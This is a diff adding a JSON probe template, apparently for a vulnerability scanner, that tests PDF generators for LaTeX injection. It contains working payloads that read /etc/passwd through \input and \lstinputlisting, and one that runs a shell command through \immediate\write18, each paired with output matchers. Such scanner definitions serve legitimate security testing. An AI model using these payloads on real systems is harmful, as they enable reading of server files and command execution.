@@ -1,0 +1,62 @@
+{
+  "category": "latex_injection",
+  "contexts": {
+    "file_read": {
+      "description": "LaTeX injection for file read -- inject LaTeX commands in PDF generators to read server files",
+      "tech_match": ["LaTeX", "PDF", "pdflatex", "xelatex"],
+      "param_match": ["title", "name", "content", "text", "description", "template", "report", "document"],
+      "probes": [
+        {
+          "payload": "\\input{/etc/passwd}",
+          "description": "LaTeX file inclusion via \\input -- reads file content into generated PDF",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0:0:", "root:!:0:0:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "\\lstinputlisting{/etc/passwd}",
+          "description": "LaTeX listings package file read -- alternative to \\input using listings package",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0:0:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "command_execution": {
+      "description": "LaTeX injection for command execution -- use \\write18 or \\immediate\\write18 for shell access",
+      "tech_match": ["LaTeX", "pdflatex"],
+      "param_match": ["content", "text", "template"],
+      "probes": [
+        {
+          "payload": "\\immediate\\write18{id}",
+          "description": "LaTeX shell escape via \\write18 -- requires -shell-escape flag enabled on pdflatex. Outputs command result in PDF build log.",
+          "matchers": [
+            {"type": "word", "words": ["uid=", "gid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        }
+      ]
+    },
+    "detection": {
+      "description": "LaTeX injection detection -- confirm LaTeX processing by injecting safe math expressions",
+      "tech_match": [],
+      "param_match": ["title", "name", "content", "text", "description"],
+      "probes": [
+        {
+          "payload": "$7\\times7$",
+          "description": "LaTeX math mode probe -- if output renders 7x7 as formatted math instead of literal text, LaTeX processing is confirmed",
+          "matchers": [
+            {"type": "not_word", "words": ["$7\\times7$"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    }
+  }
+}
